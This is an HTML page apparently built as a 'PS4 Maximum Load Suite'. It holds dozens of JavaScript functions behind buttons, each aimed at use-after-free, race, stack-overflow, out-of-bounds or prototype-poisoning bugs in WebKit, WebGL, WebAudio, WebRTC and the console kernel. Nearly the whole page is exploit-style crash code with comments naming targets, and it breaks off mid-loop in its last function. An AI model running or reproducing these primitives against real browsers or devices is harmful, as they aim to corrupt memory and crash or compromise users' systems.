<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>PS4 Maximum Load Suite (v5000)</title>

</head>
<body>

        
    <div class="grid">
        <div class="category">
            <span class="cat-title">DOM LIFECYCLE & WORKERS (UAF)</span>
            <button onclick="runNodeRemovalUAF()">01. Node Removal Event Race</button>
            <button onclick="runWorkerTransferUAF()">02. Worker Transferable Detach</button>
            <button onclick="runEventListenerGC()">03. EventListener GC Premature Free</button>
            <button onclick="runMessagePortEntangle()">04. MessagePort Entanglement Crash</button>
            <button onclick="runTreeWalkerDetach()">05. TreeWalker Detached Root Access</button>
            <button onclick="runHTMLParserRecursion()">06. HTML Parser Nesting Overflow</button>
            <button onclick="runWorkerTransferRace()">01. Worker ArrayBuffer Transfer Race (UAF)</button>
<button onclick="runDOMNodeRemovedRace()">02. DOMNodeRemoved Event Handler Recursion</button>
<button onclick="runWebGLDeleteTextureRace()">03. WebGL Texture Delete/Draw Race (GPU Panic)</button>
<button onclick="runAudioContextCloseRace()">04. AudioContext Close/CreateSource Race</button>
<button onclick="runFetchBlobRevokeRace()">05. Fetch vs URL.revokeObjectURL Race (VFS Panic)</button>
<button onclick="runCanvasRecursiveClip()">06. Canvas2D Recursive Clip Stack Overflow</button>
<button onclick="runWebSocketDetachedSend()">07. WebSocket Send Detached Buffer (NetBSD Panic)</button>
<button onclick="runXHRReadyStateAbort()">08. XHR Abort during ReadyState Change</button>
<button onclick="runFontFaceSetIteratorInvalidation()">09. FontFaceSet Iterator Invalidation</button>
<button onclick="runMessageChannelRecursivePost()">10. MessageChannel Recursive Entanglement</button>
            <button onclick="crashSVGPathParser()">01. SVG Path Data Huge Float Parser Overflow (Heap Corruption)</button>
<button onclick="crashXSLTProcessor()">02. XSLT Processor Recursion & Transformation UAF</button>
<button onclick="crashWebGLBufferSubDataRace()">03. WebGL getBufferSubData Async Pixel Pack Race (GPU Panic)</button>
<button onclick="crashAudioBiquadFilter()">04. WebAudio BiquadFilter Type Change Race (DSP Kernel Panic)</button>
<button onclick="crashCSSCalcStack()">05. CSS calc() Deep Nesting Stack Overflow (Style Recalc Crash)</button>
<button onclick="crashReadableStreamTee()">06. ReadableStream Tee & Cancel Logic Error (Memory Leak/Crash)</button>
<button onclick="crashTextEncoderSAB()">07. TextEncoder encodeInto SharedArrayBuffer Detach Race</button>
<button onclick="crashCanvasPutImageData()">08. Canvas putImageData Prototype Poisoning (OOB Read/Write)</button>
<button onclick="crashImportNodeRecursion()">09. Document.importNode Recursive Mutation Event UAF</button>
<button onclick="crashSCTPDataChannel()">10. WebRTC DataChannel SCTP Stream ID Overflow (NetBSD Panic)</button>
            <button onclick="crashBlobRecursionStack()">01. Recursive Blob Construction Stack Smash (Kernel VFS Panic)</button>
<button onclick="crashWebGLUniformBuffer()">02. WebGL2 Uniform Buffer Binding Offset Wraparound (GPU Panic)</button>
<button onclick="crashHistoryStateObject()">03. History API PushState Serialization Mutator (Logic Error)</button>
<button onclick="crashCanvasPatternCycle()">04. Canvas Pattern Cyclic Dependency Recursion (Render Crash)</button>
<button onclick="crashPannerNodeRace()">05. WebAudio PannerNode Model Switch Race (DSP Kernel Panic)</button>
<button onclick="crashTextTrackCueUAF()">06. Video TextTrackCue Event Listener UAF (Media Engine Crash)</button>
<button onclick="crashGamepadPollution()">07. Gamepad API Prototype Pollution & Polling Race</button>
<button onclick="crashSDPCodecOverflow()">08. WebRTC SDP Codec Parameter Stack Buffer Overflow</button>
<button onclick="crashNodeInsertionRecursion()">09. DOMNodeInserted Recursive Event Flood (Stack Exhaustion)</button>
<button onclick="crashTypedArraySetOverlap()">10. TypedArray.set() Overlapping Buffer Detach Race</button>
        </div>

        <div class="category">
            <span class="cat-title">KERNEL, GPU & NETWORK (PANIC)</span>
            <button onclick="runWebGLTextureRace()">07. WebGL Texture Upload/Delete Race</button>
            <button onclick="runAudioBufferNull()">08. AudioBufferSource Null Pointer</button>
            <button onclick="runSocketSendRace()">09. WebSocket Null Buffer Send</button>
            <button onclick="runCanvasDrawCrash()">10. Canvas 2D Path Winding Crash</button>
            <button onclick="runVFSRemoveRace()">11. VFS Blob URL Lookup/Revoke</button>
            <button onclick="runFetchAbortRace()">12. Fetch Abort Signal Use-After-Free</button>
            <button onclick="crashWebGLTransformFeedback()">01. GPU Transform Feedback Buffer Overflow (Kernel Panic)</button>
<button onclick="crashAudioWorkletRace()">02. AudioContext Thread vs Main Thread Race (UAF)</button>
<button onclick="crashVFSRecursiveBlob()">03. VFS Deep Recursion & Revoke Race (Kernel Stack Smash)</button>
<button onclick="crashTreeWalkerFilter()">04. TreeWalker Filter Object Mutation (DOM UAF)</button>
<button onclick="crashSocketBufferDetach()">05. WebSocket Send vs Worker Transfer Race (NetBSD Panic)</button>
<button onclick="crashCanvasWindingRecursion()">06. Canvas 2D Path Complex Winding (Driver Stack Overflow)</button>
<button onclick="crashHTMLParserNesting()">07. HTML Parser Deep Nesting Bomb (Userland Stack Overflow)</button>
<button onclick="crashFontFaceSetIterator()">08. FontFaceSet Iterator Invalidated Access (Memory Corruption)</button>
<button onclick="crashXHRAbortObjectUAF()">09. XMLHttpRequest Abort Event Object Lifetime Race</button>
<button onclick="crashRTCGiantSDP()">10. WebRTC SDP Parser Heap Overflow (Kernel Mbuf Exhaustion)</button>
        </div>
    </div>
<div id="console"></div>
    
    <script>
        function log(msg) {
            const el = document.getElementById('console');
            el.innerText += `\n> ${msg}`;
            el.scrollTop = el.scrollHeight;
        }

        // --- 01. Node Removal UAF ---
        function runNodeRemovalUAF() {
            log("01: DOM Node Removal Race...");
            const parent = document.createElement('div');
            const child = document.createElement('div');
            parent.appendChild(child);
            child.addEventListener('DOMNodeRemoved', () => {
                // Remove o pai durante a remoção do filho
                try { document.body.removeChild(parent); } catch(e){}
                // Tenta acessar propriedades do pai morto
                const x = parent.innerHTML; 
            });
            document.body.appendChild(parent);
            parent.removeChild(child);
        }

        // --- 02. Worker Transferable Detach ---
        function runWorkerTransferUAF() {
            log("02: Worker Transfer Race...");
            const ab = new ArrayBuffer(1024*1024);
            const view = new Int32Array(ab);
            const w = new Worker(URL.createObjectURL(new Blob([""],{type:'text/js'})));
            setTimeout(() => w.postMessage(ab, [ab]), 0); // Detach async
            try {
                for(let i=0; i<10000; i++) view[0] = 0x41414141; // Write on free
            } catch(e){}
        }

        // --- 03. EventListener GC Premature Free ---
        function runEventListenerGC() {
            log("03: EventListener GC Race...");
            const btn = document.createElement('button');
            let handler = { handleEvent: () => {} };
            btn.addEventListener('click', handler);
            handler = null; // Remove ref forte
            // Força pressão de memória
            const trash = new Array(5000).fill(1).map(()=>new Uint8Array(1024));
            btn.click(); // Dispatch em objeto potencialmente coletado
        }

        // --- 04. MessagePort Entanglement Crash ---
        function runMessagePortEntangle() {
            log("04: MessagePort Entangle...");
            const ch = new MessageChannel();
            ch.port1.close();
            // Tenta enviar a porta fechada por ela mesma (ciclo inválido em C++)
            try { ch.port2.postMessage("", [ch.port1]); } catch(e){}
        }

        // --- 05. TreeWalker Detached Root Access ---
        function runTreeWalkerDetach() {
            log("05: TreeWalker Detach...");
            const root = document.createElement('div');
            const walker = document.createTreeWalker(root);
            // Destroi a raiz C++
            root.remove(); 
            // Tenta caminhar no vazio
            walker.nextNode(); 
        }

        // --- 06. HTML Parser Nesting Overflow ---
        function runHTMLParserRecursion() {
            log("06: HTML Parser Stack Overflow...");
            // Cria string HTML com aninhamento insano para estourar a stack do parser C++
            const html = "<div>".repeat(20000) + "</div>".repeat(20000);
            const div = document.createElement('div');
            div.innerHTML = html; // Trigger parser
        }

        // --- 07. WebGL Texture Upload/Delete Race ---
        function runWebGLTextureRace() {
            log("07: GPU Texture Race...");
            const c = document.createElement('canvas');
            const gl = c.getContext('webgl');
            const tex = gl.createTexture();
            gl.bindTexture(gl.TEXTURE_2D, tex);
            gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA, 10, 10, 0, gl.RGBA, gl.UNSIGNED_BYTE, null);
            // Delete e Draw no mesmo frame
            gl.clear(gl.COLOR_BUFFER_BIT);
            gl.deleteTexture(tex);
            gl.finish();
        }

        // --- 08. AudioBufferSource Null Pointer ---
        function runAudioBufferNull() {
            log("08: Audio Null Deref...");
            if(!window.AudioContext) return;
            const ctx = new AudioContext();
            const src = ctx.createBufferSource();
            // Inicia sem buffer (estado inválido) e conecta
            try {
                src.start();
                src.buffer = null; // Força nullificação durante start
                src.connect(ctx.destination);
            } catch(e){}
        }

        // --- 09. WebSocket Null Buffer Send ---
        function runSocketSendRace() {
            log("09: NetBSD Socket Panic...");
            const ws = new WebSocket("wss://echo.websocket.org");
            const ab = new ArrayBuffer(1024);
            ws.onopen = () => {
                const w = new Worker(URL.createObjectURL(new Blob([""],{type:'text/js'})));
                w.postMessage(ab, [ab]); // Detach
                try { ws.send(ab); } catch(e){} // Send NULL pointer
            };
        }

        // --- 10. Canvas 2D Path Winding Crash ---
        function runCanvasDrawCrash() {
            log("10: Canvas Winding Stack Overflow...");
            const c = document.createElement('canvas');
            const ctx = c.getContext('2d');
            ctx.beginPath();
            for(let i=0; i<10000; i++) ctx.rect(0,0,10,10); // Complexidade recursiva
            try { ctx.clip("evenodd"); ctx.fill(); } catch(e){}
        }

        // --- 11. VFS Blob URL Lookup/Revoke ---
        function runVFSRemoveRace() {
            log("11: VFS Blob Race...");
            const url = URL.createObjectURL(new Blob(["x"]));
            const w1 = new Worker(URL.createObjectURL(new Blob([`onmessage=u=>fetch(u)`],{type:'text/js'})));
            const w2 = new Worker(URL.createObjectURL(new Blob([`onmessage=u=>fetch(u)`],{type:'text/js'})));
            w1.postMessage(url);
            w2.postMessage(url);
            URL.revokeObjectURL(url); // Destroi o inode virtual sob carga
        }

        // --- 12. Fetch Abort Signal Use-After-Free ---
        function runFetchAbortRace() {
            log("12: Fetch Abort UAF...");
            const ac = new AbortController();
            const signal = ac.signal;
            fetch(location.href, {signal}).catch(e=>{});
            // Aborta e tenta forçar uso do sinal internamente
            ac.abort();
            // Cria pressão para limpar o objeto do sinal
            let a = []; for(let i=0;i<1000;i++) a.push({});
        }



function runWorkerTransferRace() {
    const ab = new ArrayBuffer(1024 * 1024 * 8);
    const view = new Int32Array(ab);
    const w = new Worker(URL.createObjectURL(new Blob([""], {type: 'text/javascript'})));
    setTimeout(() => w.postMessage(ab, [ab]), 0);
    for (let i = 0; i < 100000; i++) {
        view[0] = 0x41414141;
    }
}

function runDOMNodeRemovedRace() {
    const d1 = document.createElement('div');
    const d2 = document.createElement('div');
    d1.appendChild(d2);
    d2.addEventListener('DOMNodeRemoved', () => {
        try {
            document.body.removeChild(d1);
            d2.innerHTML = "A".repeat(1024);
        } catch (e) {}
    });
    document.body.appendChild(d1);
    d1.removeChild(d2);
}

function runWebGLDeleteTextureRace() {
    const gl = document.createElement('canvas').getContext('webgl');
    const tex = gl.createTexture();
    gl.bindTexture(gl.TEXTURE_2D, tex);
    gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA, 64, 64, 0, gl.RGBA, gl.UNSIGNED_BYTE, null);
    const fb = gl.createFramebuffer();
    gl.bindFramebuffer(gl.FRAMEBUFFER, fb);
    gl.framebufferTexture2D(gl.FRAMEBUFFER, gl.COLOR_ATTACHMENT0, gl.TEXTURE_2D, tex, 0);
    gl.clear(gl.COLOR_BUFFER_BIT);
    gl.deleteTexture(tex);
    gl.finish();
}

function runAudioContextCloseRace() {
    if (!window.AudioContext) return;
    const ctx = new AudioContext();
    const src = ctx.createOscillator();
    src.connect(ctx.destination);
    src.start();
    setTimeout(() => {
        ctx.close();
        try {
            src.stop();
            src.disconnect();
        } catch (e) {}
    }, 0);
}

function runFetchBlobRevokeRace() {
    const blob = new Blob([new ArrayBuffer(1024 * 1024)]);
    const url = URL.createObjectURL(blob);
    const w = new Worker(URL.createObjectURL(new Blob([`onmessage=u=>{for(let i=0;i<100;i++)fetch(u).catch(()=>{})}`], {type: 'text/javascript'})));
    w.postMessage(url);
    setTimeout(() => URL.revokeObjectURL(url), 1);
}

function runCanvasRecursiveClip() {
    const ctx = document.createElement('canvas').getContext('2d');
    ctx.beginPath();
    for (let i = 0; i < 5000; i++) ctx.rect(0, 0, 100, 100);
    ctx.clip("evenodd");
    ctx.fill();
}

function runWebSocketDetachedSend() {
    const ws = new WebSocket("wss://echo.websocket.org");
    const ab = new ArrayBuffer(1024);
    ws.onopen = () => {
        const w = new Worker(URL.createObjectURL(new Blob([""], {type: 'text/javascript'})));
        w.postMessage(ab, [ab]);
        ws.send(ab);
    };
}

function runXHRReadyStateAbort() {
    const xhr = new XMLHttpRequest();
    xhr.open('GET', location.href);
    xhr.onreadystatechange = () => {
        if (xhr.readyState === 2) {
            xhr.abort();
            const s = xhr.status;
        }
    };
    xhr.send();
}

function runFontFaceSetIteratorInvalidation() {
    const font = new FontFace("X", "url(x)");
    const set = document.fonts;
    set.add(font);
    set.forEach((f, f2, s) => {
        s.clear();
        s.add(new FontFace("Y", "url(y)"));
    });
}

function runMessageChannelRecursivePost() {
    const ch = new MessageChannel();
    const p1 = ch.port1;
    const p2 = ch.port2;
    p1.onmessage = (e) => {
        p1.postMessage(e.data, [e.data]);
    };
    const ab = new ArrayBuffer(1);
    p2.postMessage(ab, [ab]);
}




   
function crashWebGLTransformFeedback() {
    const canvas = document.createElement('canvas');
    const gl = canvas.getContext('webgl2');
    if (!gl) return;
    const vsSource = `#version 300 es
    in vec4 position; void main() { gl_Position = position; }`;
    const fsSource = `#version 300 es
    precision highp float; out vec4 color; void main() { color = vec4(1.0); }`;
    const vs = gl.createShader(gl.VERTEX_SHADER);
    gl.shaderSource(vs, vsSource);
    gl.compileShader(vs);
    const fs = gl.createShader(gl.FRAGMENT_SHADER);
    gl.shaderSource(fs, fsSource);
    gl.compileShader(fs);
    const program = gl.createProgram();
    gl.attachShader(program, vs);
    gl.attachShader(program, fs);
    gl.transformFeedbackVaryings(program, ["gl_Position"], gl.SEPARATE_ATTRIBS);
    gl.linkProgram(program);
    gl.useProgram(program);
    const tbo = gl.createBuffer();
    gl.bindBuffer(gl.TRANSFORM_FEEDBACK_BUFFER, tbo);
    gl.bufferData(gl.TRANSFORM_FEEDBACK_BUFFER, 16, gl.DYNAMIC_COPY);
    gl.bindBufferBase(gl.TRANSFORM_FEEDBACK_BUFFER, 0, tbo);
    gl.beginTransformFeedback(gl.POINTS);
    const hugeArray = new Float32Array(1000000); 
    const vbo = gl.createBuffer();
    gl.bindBuffer(gl.ARRAY_BUFFER, vbo);
    gl.bufferData(gl.ARRAY_BUFFER, hugeArray, gl.STATIC_DRAW);
    const loc = gl.getAttribLocation(program, "position");
    gl.enableVertexAttribArray(loc);
    gl.vertexAttribPointer(loc, 4, gl.FLOAT, false, 0, 0);
    gl.drawArrays(gl.POINTS, 0, 1000000);
    gl.endTransformFeedback();
    gl.finish();
}

function crashAudioWorkletRace() {
    if (!window.AudioContext) return;
    const ctx = new AudioContext();
    const bufferSize = 4096;
    const channels = 2;
    const frameCount = ctx.sampleRate * 2.0;
    const audioBuffer = ctx.createBuffer(channels, frameCount, ctx.sampleRate);
    for (let channel = 0; channel < channels; channel++) {
        const nowBuffering = audioBuffer.getChannelData(channel);
        for (let i = 0; i < frameCount; i++) {
            nowBuffering[i] = Math.random() * 2 - 1;
        }
    }
    const source = ctx.createBufferSource();
    source.buffer = audioBuffer;
    source.connect(ctx.destination);
    source.start();
    const ab = audioBuffer.getChannelData(0).buffer;
    const w = new Worker(URL.createObjectURL(new Blob([""], {type: 'text/javascript'})));
    const killer = setInterval(() => {
        try {
            w.postMessage(ab, [ab]);
            ctx.close();
            source.disconnect();
            clearInterval(killer);
        } catch(e) {}
    }, 1);
    for(let i=0; i<10000; i++) {
        const x = new Float32Array(1024);
        x.fill(Math.random());
    }
}

function crashVFSRecursiveBlob() {
    const blobs = [];
    const urls = [];
    for(let i=0; i<5000; i++) {
        const b = new Blob([new ArrayBuffer(1024)], {type: 'application/octet-stream'});
        blobs.push(b);
        urls.push(URL.createObjectURL(b));
    }
    const workerCode = `onmessage = function(e) {
        const urls = e.data;
        for(let i=0; i<urls.length; i++) {
            fetch(urls[i]).then(r => r.blob()).catch(e=>{});
        }
    }`;
    const workers = [];
    for(let i=0; i<4; i++) {
        const w = new Worker(URL.createObjectURL(new Blob([workerCode], {type: 'text/javascript'})));
        w.postMessage(urls);
        workers.push(w);
    }
    setTimeout(() => {
        for(let i=0; i<urls.length; i++) {
            URL.revokeObjectURL(urls[i]);
        }
        workers.forEach(w => w.terminate());
    }, 10);
}

function crashTreeWalkerFilter() {
    const root = document.createElement('div');
    let current = root;
    for(let i=0; i<1000; i++) {
        const child = document.createElement('span');
        current.appendChild(child);
        current = child;
    }
    document.body.appendChild(root);
    const filter = {
        acceptNode: function(node) {
            if (node.tagName === 'SPAN') {
                try {
                    // Destructive mutation during traversal
                    node.parentNode.innerHTML = ""; 
                    const trash = new Array(10000).fill(1.1);
                } catch(e) {}
                return NodeFilter.FILTER_ACCEPT;
            }
            return NodeFilter.FILTER_SKIP;
        }
    };
    const walker = document.createTreeWalker(root, NodeFilter.SHOW_ELEMENT, filter, false);
    while(walker.nextNode()) {
        const n = walker.currentNode;
        n.textContent = "Modified";
    }
    document.body.removeChild(root);
}

function crashSocketBufferDetach() {
    const ws = new WebSocket("wss://echo.websocket.org");
    const bufferSize = 1024 * 1024 * 16; // 16MB
    const ab = new ArrayBuffer(bufferSize);
    const view = new Uint8Array(ab);
    view.fill(0x41);
    
    ws.onopen = () => {
        const w = new Worker(URL.createObjectURL(new Blob([""], {type: 'text/javascript'})));
        
        // High frequency race attempt
        const attempts = 100;
        for(let i=0; i<attempts; i++) {
            try {
                if (i === 50) {
                    w.postMessage(ab, [ab]); // Detach at critical moment
                }
                ws.send(ab); // Try to send detached pointer
            } catch(e) {}
        }
        ws.close();
    };
}

function crashCanvasWindingRecursion() {
    const canvas = document.createElement('canvas');
    canvas.width = 4096;
    canvas.height = 4096;
    const ctx = canvas.getContext('2d');
    ctx.beginPath();
    
    // Create massive path complexity
    for (let i = 0; i < 20000; i++) {
        ctx.rect(i % 100, i % 100, 50, 50);
        ctx.arc(i % 200, i % 200, 20, 0, Math.PI * 2);
        if (i % 100 === 0) {
            ctx.moveTo(Math.random() * 4000, Math.random() * 4000);
            ctx.lineTo(Math.random() * 4000, Math.random() * 4000);
        }
    }
    
    // Force driver recursion
    try {
        ctx.clip("evenodd");
        for(let j=0; j<50; j++) {
            ctx.fillStyle = (j % 2 === 0) ? 'red' : 'blue';
            ctx.fill();
            ctx.stroke();
        }
    } catch(e) {}
}

function crashHTMLParserNesting() {
    let deepHTML = "";
    const depth = 15000;
    
    for (let i = 0; i < depth; i++) {
        deepHTML += "<div class='nested' id='d" + i + "'>";
    }
    for (let i = 0; i < depth; i++) {
        deepHTML += "</div>";
    }
    
    const container = document.createElement('div');
    // Force immediate parsing
    container.innerHTML = deepHTML;
    document.body.appendChild(container);
    
    // Force layout engine to traverse the deep tree
    const leaf = document.getElementById('d' + (depth - 1));
    if (leaf) {
        const style = window.getComputedStyle(leaf);
        const color = style.color; 
        leaf.innerHTML = "<b>Reflow</b>";
    }
}

function crashFontFaceSetIterator() {
    const set = document.fonts;
    const faces = [];
    
    for(let i=0; i<1000; i++) {
        const f = new FontFace("CrashFont" + i, "url(data:font/woff;base64,AAEAAA...)");
        faces.push(f);
        set.add(f);
    }
    
    // Iterate and destroy
    set.forEach((face, face2, setRef) => {
        // Clear the set during iteration
        setRef.clear();
        
        // Force memory pressure to reclaim FontFace objects
        const heavy = [];
        for(let k=0; k<5000; k++) heavy.push(new Uint8Array(2048));
        
        // Try to access potentially freed iterator internal pointer
        try {
            face.load().catch(()=>{});
        } catch(e) {}
    });
}

function crashXHRAbortObjectUAF() {
    const xhr = new XMLHttpRequest();
    xhr.open('GET', location.href + '?rand=' + Math.random(), true);
    
    // Setup complex object graph on the XHR
    xhr.customProp = { 
        data: new Array(10000).fill("A").join(""),
        nested: { ref: xhr }
    };
    
    xhr.onreadystatechange = function() {
        if (xhr.readyState > 1) {
            // Abort mid-stream
            xhr.abort();
            
            // Access properties that might rely on internal C++ state
            const status = xhr.status;
            const response = xhr.responseText;
            
            // Delete references to force GC
            delete xhr.customProp;
            
            // Alloc garbage
            const arr = [];
            for(let i=0; i<5000; i++) arr.push({});
        }
    };
    xhr.send();
}

function crashRTCGiantSDP() {
    if (!window.RTCPeerConnection) return;
    const pc = new RTCPeerConnection();
    
    // Construct a massive SDP string to overflow kernel mbuf clusters
    let sdp = "v=0\r\no=- 0 0 IN IP4 127.0.0.1\r\ns=-\r\nt=0 0\r\n";
    for(let i=0; i<25000; i++) {
        sdp += "m=audio " + (10000 + i) + " RTP/AVP 0\r\n";
        sdp += "a=rtpmap:0 PCMU/8000\r\n";
        sdp += "a=candidate:1 1 UDP 12345678 127.0.0.1 12345 typ host\r\n";
    }
    
    try {
        const desc = new RTCSessionDescription({ type: 'offer', sdp: sdp });
        pc.setRemoteDescription(desc)
          .then(() => {})
          .catch(e => {});
          
        // Rapidly close to trigger UAF during parsing
        setTimeout(() => pc.close(), 2);
    } catch(e) {}
}



function crashSVGPathParser() {
    // Vector: SVG Path Data Parsing Heap Overflow
    // Target: WebCore::SVGPathParser
    const svgNS = "http://www.w3.org/2000/svg";
    const path = document.createElementNS(svgNS, "path");
    
    // Construct a massive, malformed path string to stress the float parser
    // "M" (MoveTo) followed by millions of coordinates, switching scientific notation
    let d = "M 0 0";
    const chunk = " L 1.2345e-10 9.8765e+10 C 1 2 3 4 5 6";
    
    // Allocate ~10MB string to overflow internal parser buffer or stack
    for(let i=0; i<50000; i++) {
        d += chunk;
    }
    
    // Force immediate parsing and layout calculation
    path.setAttribute("d", d);
    document.body.appendChild(path);
    
    try {
        // Force the engine to walk the path segments, triggering the corruption
        const len = path.getTotalLength();
        const point = path.getPointAtLength(len / 2);
        
        // Mutate during read
        path.setAttribute("d", "M 0 0"); 
        
        // Access potentially freed memory
        console.log(point.x);
    } catch(e) {}
    
    document.body.removeChild(path);
}

function crashXSLTProcessor() {
    // Vector: Libxslt Transformation UAF
    // Target: WebCore::XSLTProcessor
    const xmlString = `
        <root>
            ${"<item>data</item>".repeat(2000)}
        </root>`;
    
    const xslString = `
        <xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
            <xsl:template match="/">
                <xsl:for-each select="//item">
                    <span><xsl:value-of select="."/></span>
                </xsl:for-each>
            </xsl:template>
        </xsl:stylesheet>`;

    const parser = new DOMParser();
    const xmlDoc = parser.parseFromString(xmlString, "text/xml");
    const xslDoc = parser.parseFromString(xslString, "text/xml");
    
    const processor = new XSLTProcessor();
    processor.importStylesheet(xslDoc);
    
    // Race condition: Modify the source document WHILE transforming
    const fragment = processor.transformToFragment(xmlDoc, document);
    
    // Recursive depth stress
    function stress() {
        try {
            // Re-import and transform in a tight loop to corrupt libxslt state
            processor.importStylesheet(xslDoc);
            processor.transformToDocument(xmlDoc);
            // Intentionally corrupt the XML doc structure
            xmlDoc.documentElement.appendChild(xmlDoc.createElement("new"));
        } catch(e) {}
    }
    
    for(let i=0; i<100; i++) stress();
}

function crashWebGLBufferSubDataRace() {
    // Vector: GPU Buffer Readback Race
    // Target: GNM Driver / getBufferSubData
    const c = document.createElement('canvas');
    const gl = c.getContext('webgl2');
    if(!gl) return;
    
    const buffer = gl.createBuffer();
    gl.bindBuffer(gl.COPY_READ_BUFFER, buffer);
    gl.bufferData(gl.COPY_READ_BUFFER, 1024 * 1024, gl.DYNAMIC_READ);
    
    const readView = new Uint8Array(1024 * 1024);
    
    // Create a worker to detach the destination buffer during readback
    const w = new Worker(URL.createObjectURL(new Blob([""], {type: 'text/javascript'})));
    
    // This function triggers a DMA transfer from GPU to CPU memory
    // If the destination memory (readView) is detached during transfer, the DMA writes to void
    
    // Schedule detach
    setTimeout(() => {
        w.postMessage(readView.buffer, [readView.buffer]);
    }, 0);
    
    // Trigger heavy GPU operation
    for(let i=0; i<1000; i++) {
        try {
            gl.getBufferSubData(gl.COPY_READ_BUFFER, 0, readView);
            // Write to buffer to ensure page is dirty
            gl.bufferSubData(gl.COPY_READ_BUFFER, 0, new Uint8Array([1,2,3,4]));
        } catch(e) {}
    }
}

function crashAudioBiquadFilter() {
    // Vector: Audio DSP Kernel Panic
    // Target: WebAudio BiquadFilterNode Process
    if (!window.AudioContext) return;
    const ctx = new AudioContext();
    const osc = ctx.createOscillator();
    const filter = ctx.createBiquadFilter();
    
    osc.connect(filter);
    filter.connect(ctx.destination);
    osc.start();
    
    // Rapidly switch filter types and parameters to confuse the DSP kernel
    // The filter allocates different internal structures for 'lowpass' vs 'peaking'
    const types = ["lowpass", "highpass", "bandpass", "lowshelf", "highshelf", "peaking", "notch", "allpass"];
    
    const interval = setInterval(() => {
        try {
            const t = types[Math.floor(Math.random() * types.length)];
            filter.type = t;
            
            // Set nonsensical values to provoke floating point exceptions or buffer overflows
            filter.frequency.setValueAtTime(NaN, ctx.currentTime);
            filter.Q.value = Infinity;
            filter.gain.value = -3.4028235e38; // Min float
            
            // Disconnect and reconnect rapidly
            filter.disconnect();
            filter.connect(ctx.destination);
        } catch(e) {
            clearInterval(interval);
            ctx.close();
        }
    }, 1);
    
    // Run for 2 seconds then stop
    setTimeout(() => { clearInterval(interval); ctx.close(); }, 2000);
}

function crashCSSCalcStack() {
    // Vector: CSS Parser Stack Overflow
    // Target: WebCore::CSSParser
    const div = document.createElement('div');
    document.body.appendChild(div);
    
    // Construct a deeply nested calc() expression
    // calc(1px + calc(1px + calc(...)))
    let style = "1px";
    for(let i=0; i<8000; i++) {
        style = `calc(1px + ${style})`;
    }
    
    // Apply style. This forces the recursive descent parser to go deep.
    // On systems with limited stack size (like PS4 WebKit), this hits the stack guard page.
    try {
        div.style.width = style;
        
        // Force style recalculation / Reflow
        const computed = window.getComputedStyle(div).width;
        
        // If we are still alive, try to read it back and mutate
        div.style.height = style;
    } catch(e) {}
    
    document.body.removeChild(div);
}

function crashReadableStreamTee() {
    // Vector: Streams API Logic Error
    // Target: ReadableStreamTeeEngine
    let controller;
    const stream = new ReadableStream({
        start(c) { controller = c; }
    });
    
    // Tee the stream (branching)
    const [branch1, branch2] = stream.tee();
    
    // Enqueue massive data
    const chunk = new Uint8Array(1024 * 1024).fill(0x41);
    
    // Race: Cancel one branch while reading the other and enqueuing data
    const reader1 = branch1.getReader();
    const reader2 = branch2.getReader();
    
    // 1. Enqueue data
    controller.enqueue(chunk);
    
    // 2. Read from branch 1
    reader1.read().then(() => {
        // 3. Cancel branch 2 inside the resolution of branch 1
        // This manipulates the internal ref-counts of the source stream chunks
        branch2.cancel("Crash");
        
        // 4. Close source
        try { controller.close(); } catch(e){}
        
        // 5. Try to read from cancelled stream logic
        reader2.read().catch(()=>{});
    });
}

function crashTextEncoderSAB() {
    // Vector: TextEncoder SAB Detach Race
    // Target: TextEncoder::encodeInto
    const encoder = new TextEncoder();
    const sab = new SharedArrayBuffer(1024 * 1024);
    const u8 = new Uint8Array(sab);
    
    // Huge string to ensure encoding takes measurable CPU time
    const str = "A".repeat(100000);
    
    const w = new Worker(URL.createObjectURL(new Blob([""], {type: 'text/javascript'})));
    
    // Schedule a transfer (which detaches the buffer on main thread) 
    // to happen exactly when encodeInto is processing
    setTimeout(() => {
        w.postMessage(sab);
    }, 0);
    
    // Loop encoding. If detach happens during the loop C++ logic, 
    // it writes to unmapped memory.
    try {
        for(let i=0; i<1000; i++) {
            // encodeInto writes directly to the destination buffer
            encoder.encodeInto(str, u8);
        }
    } catch(e) {}
}

function crashCanvasPutImageData() {
    // Vector: Canvas OOB via Prototype Poisoning
    // Target: CanvasRenderingContext2D::putImageData
    const c = document.createElement('canvas');
    c.width = 100; c.height = 100;
    const ctx = c.getContext('2d');
    
    // Create ImageData
    const imgData = ctx.createImageData(100, 100);
    
    // Poison the Uint8ClampedArray prototype to intercept data access
    const proto = Object.getPrototypeOf(imgData.data);
    
    // We define a getter for 'length' or specific indices
    // This confuses the validation logic inside putImageData
    Object.defineProperty(proto, 'length', {
        get: () => {
            // When the engine asks for length, we return a safe value
            // but internally detach or shrink the buffer
            return 0; // Return 0 to bypass loops or 0xFFFFFFFF to cause overflow
        }
    });
    
    try {
        // The buffer inside imgData is now manipulated
        // putImageData expects 100*100*4 bytes. If it gets less logic/buffer, it reads OOB.
        ctx.putImageData(imgData, 0, 0);
    } catch(e) {}
    
    // Restore prototype to avoid breaking the rest of the page immediately
    delete proto.length;
}

function crashImportNodeRecursion() {
    // Vector: ImportNode Recursive UAF
    // Target: Document::importNode
    const doc = document.implementation.createHTMLDocument("crash");
    const div = doc.createElement("div");
    const child = doc.createElement("span");
    div.appendChild(child);
    
    // Prepare a malicious node that mutates the tree during cloning
    // importNode performs a deep clone. 
    // If we can execute JS during the clone (via Custom Elements or Mutation Events), we win.
    
    // Note: PS4 WebKit version might support Mutation Events which are deprecated but dangerous
    child.addEventListener("DOMSubtreeModified", () => {
        // When the browser clones 'child', this fires.
        // We destroy the source 'div' or the destination parent.
        div.innerHTML = "";
        
        // Create memory pressure
        const junk = new Array(1000).fill(1.1);
    });
    
    try {
        // Deep import. This walks the tree C++ side.
        // The event handler corrupts the tree structure mid-walk.
        document.importNode(div, true);
    } catch(e) {}
}

function crashSCTPDataChannel() {
    // Vector: SCTP Stream ID Integer Overflow
    // Target: WebRTC SCTP / NetBSD Kernel
    if (!window.RTCPeerConnection) return;
    
    const pc = new RTCPeerConnection();
    
    // Create thousands of data channels to exhaust Stream IDs (usually 16-bit)
    // and kernel mbuf clusters allocated for each channel state.
    const channels = [];
    
    try {
        // Loop until near 65535 limit
        for(let i=0; i<60000; i++) {
